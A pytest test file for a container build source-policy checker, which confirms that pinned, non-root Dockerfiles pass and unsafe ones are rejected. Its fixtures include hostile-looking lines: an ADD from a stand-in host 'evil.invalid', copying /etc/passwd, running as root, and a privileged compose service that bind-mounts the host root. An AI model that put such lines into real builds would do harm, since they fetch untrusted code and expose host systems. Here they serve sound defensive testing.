from __future__ import annotations

import copy
import json
from pathlib import Path

import pytest
from vonk_control.source_bundles import generate_source_bundle
from vonk_control.source_policy import SourcePolicyError, enforce_build_source_policy


@pytest.fixture
def recipe() -> dict[str, object]:
    return json.loads(
        (Path(__file__).parent / "fixtures/global/recipe-v1-minimal.json").read_text()
    )


def bundle_for(recipe: dict[str, object], dockerfile: str, **files: bytes):
    bundle = generate_source_bundle({"Dockerfile": dockerfile.encode(), **files})
    recipe["build"]["context"]["sha256"] = bundle.sha256
    recipe["build"]["context"]["expected_bytes"] = len(bundle.archive)
    return bundle


def test_digest_pinned_non_root_source_passes(recipe: dict[str, object]) -> None:
    bundle = bundle_for(
        recipe,
        "FROM ghcr.io/example/vllm@sha256:" + "a" * 64 + "\nUSER 10001:10001\n",
    )

    report = enforce_build_source_policy(recipe, bundle)

    assert report.passed is True
    assert report.dockerfile == "Dockerfile"


def test_absolute_copy_source_from_named_stage_passes(
    recipe: dict[str, object],
) -> None:
    bundle = bundle_for(
        recipe,
        "FROM docker.io/library/busybox@sha256:"
        + "a" * 64
        + " AS tools\n"
        + "FROM ghcr.io/example/runtime@sha256:"
        + "b" * 64
        + "\nCOPY --from=tools /bin/busybox /opt/runtime/busybox\n"
        + "USER 10001:10001\n",
    )

    report = enforce_build_source_policy(recipe, bundle)

    assert report.passed is True


@pytest.mark.parametrize(
    ("dockerfile", "code"),
    [
        ("FROM ghcr.io/example/vllm:latest\nUSER 10001\n", "dockerfile.base_unpinned"),
        (
            "FROM ghcr.io/example/vllm@sha256:" + "0" * 64 + "\nUSER 10001\n",
            "dockerfile.base_placeholder",
        ),
        (
            "FROM ghcr.io/example/x@sha256:"
            + "a" * 64
            + "\nADD https://evil.invalid/x /x\nUSER 10001\n",
            "dockerfile.add_forbidden",
        ),
        (
            "FROM ghcr.io/example/x@sha256:"
            + "a" * 64
            + "\nRUN --mount=type=secret echo x\nUSER 10001\n",
            "dockerfile.secret_mount",
        ),
        (
            "FROM ghcr.io/example/x@sha256:"
            + "a" * 64
            + "\nCOPY /etc/passwd /opt/runtime/passwd\nUSER 10001\n",
            "dockerfile.copy_path",
        ),
        (
            "FROM ghcr.io/example/x@sha256:" + "a" * 64 + "\nUSER root\n",
            "dockerfile.root_user",
        ),
    ],
)
def test_unsafe_dockerfile_is_rejected(
    recipe: dict[str, object], dockerfile: str, code: str
) -> None:
    bundle = bundle_for(recipe, dockerfile)

    with pytest.raises(SourcePolicyError) as caught:
        enforce_build_source_policy(recipe, bundle)

    assert caught.value.report.findings[0].code == code


def test_unsafe_compose_is_rejected(recipe: dict[str, object]) -> None:
    compose = (
        b"services:\n  model:\n    privileged: true\n    volumes:\n      - /:/host\n"
    )
    bundle = bundle_for(
        recipe,
        "FROM ghcr.io/example/x@sha256:" + "a" * 64 + "\nUSER 10001\n",
        **{"compose.yaml": compose},
    )

    with pytest.raises(SourcePolicyError) as caught:
        enforce_build_source_policy(recipe, bundle)

    assert {finding.code for finding in caught.value.report.findings} == {
        "compose.host_bind",
        "compose.privileged",
    }


def test_bundle_identity_must_match_recipe(recipe: dict[str, object]) -> None:
    bundle = bundle_for(
        recipe,
        "FROM ghcr.io/example/x@sha256:" + "a" * 64 + "\nUSER 10001\n",
    )
    changed = copy.deepcopy(recipe)
    changed["build"]["context"]["sha256"] = "b" * 64

    with pytest.raises(SourcePolicyError) as caught:
        enforce_build_source_policy(changed, bundle)

    assert caught.value.report.findings[0].code == "source.digest_mismatch"


def test_public_build_refuses_a_url_outside_the_declared_host_allowlist(
    recipe: dict[str, object],
) -> None:
    recipe["build"]["network"] = {
        "mode": "public",
        "hosts": ["archives.example"],
    }
    bundle = bundle_for(
        recipe,
        "FROM ghcr.io/example/x@sha256:"
        + "a" * 64
        + "\nRUN curl --fail https://undeclared.example/source.tar.gz -o /tmp/source\n"
        + "USER 10001\n",
    )

    with pytest.raises(SourcePolicyError) as caught:
        enforce_build_source_policy(recipe, bundle)

    assert caught.value.report.findings[0].code == "dockerfile.network_host"


def test_public_build_accepts_only_urls_on_the_declared_host_allowlist(
    recipe: dict[str, object],
) -> None:
    recipe["build"]["network"] = {
        "mode": "public",
        "hosts": ["archives.example"],
    }
    bundle = bundle_for(
        recipe,
        "FROM ghcr.io/example/x@sha256:"
        + "a" * 64
        + "\nRUN curl --fail https://archives.example/source.tar.gz -o /tmp/source\n"
        + "USER 10001\n",
    )

    assert enforce_build_source_policy(recipe, bundle).passed is True
